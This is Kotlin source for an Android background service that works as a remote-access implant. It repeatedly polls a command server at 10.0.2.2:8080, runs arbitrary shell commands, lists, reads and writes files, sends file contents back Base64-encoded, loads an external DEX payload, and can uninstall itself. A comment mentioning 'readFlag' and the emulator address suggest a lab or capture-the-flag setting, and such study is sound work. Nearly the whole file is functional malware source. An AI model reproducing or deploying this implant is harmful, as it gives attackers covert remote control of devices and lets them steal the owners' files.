package mobile.morph.agent

import android.app.Service
import android.content.Intent
import android.os.IBinder
import okhttp3.*
import org.json.JSONObject
import java.io.File
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Base64

class MainService : Service() {
    private val client = OkHttpClient()
    private val agentId = "demo_agent"  // Optionally make this dynamic

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            while (true) {
                try {
                    val request = Request.Builder()
                        .url("http://10.0.2.2:8080/cmd?agent_id=$agentId")
                        .build()
                    val response = client.newCall(request).execute()
                    val cmdJson = response.body?.string() ?: return@Thread
                    val cmd = JSONObject(cmdJson)

                    val result = when (cmd.getString("cmd")) {
                        "run_shell" -> runShell(cmd.getString("args"))
                        "list_files" -> listFiles(cmd.getString("path"))
                        "read_file" -> readFile(cmd.getString("path"))
                        "write_file" -> writeFile(cmd.getString("path"), cmd.getString("content"))
                        "load_jar" -> try {
                            val dexPath = "/sdcard/payload.jar"
                            val optimizedDir = applicationContext.getDir("dex", 0).absolutePath
                            val classLoader = dalvik.system.DexClassLoader(dexPath, optimizedDir, null, classLoader)
                            val clazz = classLoader.loadClass("agent_payloads.Payload")
                            val method = clazz.getMethod("execute")  // or "readFlag"
                            val output = method.invoke(null).toString()
                            "Loaded Payload: $output"
                        } catch (e: Exception) {
                            "Dex load failed: ${e.message}"
                        }
                        "uninstall" -> {
                            uninstallAgent()
                            "Agent self-uninstalled"
                        }
                        else -> "Unknown command"
                    }

                    postResult(result)
                    Thread.sleep(5000)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }.start()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun runShell(cmd: String): String {
        return try {
            Runtime.getRuntime().exec(cmd)
                .inputStream.bufferedReader().readText()
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun listFiles(path: String): String {
        return try {
            val dir = File(path)
            if (dir.exists() && dir.isDirectory) {
                dir.list()?.joinToString("\n") ?: "Empty directory"
            } else {
                "Not a directory: $path"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun readFile(path: String): String {
        return try {
            val file = File(path)
            if (file.exists()) {
                val content = file.readBytes()
                Base64.encodeToString(content, Base64.NO_WRAP)
            } else {
                "File not found"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun writeFile(path: String, base64Content: String): String {
        return try {
            val decoded = Base64.decode(base64Content, Base64.NO_WRAP)
            File(path).writeBytes(decoded)
            "File written to $path"
        } catch (e: Exception) {
            "Error writing file: ${e.message}"
        }
    }

    private fun uninstallAgent() {
        // Self-uninstall logic (broadcast uninstall intent)
        val intent = Intent(Intent.ACTION_DELETE)
        intent.data = Uri.parse("package=$packageName")
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK

        // Use main thread to launch uninstall intent
        Handler(Looper.getMainLooper()).post {
            startActivity(intent)
        }
    }

    private fun postResult(result: String) {
        val postJson = JSONObject()
        postJson.put("agent_id", agentId)
        postJson.put("result", result)

        val requestBody = RequestBody.create(
            MediaType.parse("application/json; charset=utf-8"),
            postJson.toString()
        )

        val postRequest = Request.Builder()
            .url("http://10.0.2.2:8080/output")
            .post(requestBody)
            .build()

        client.newCall(postRequest).execute()
    }
}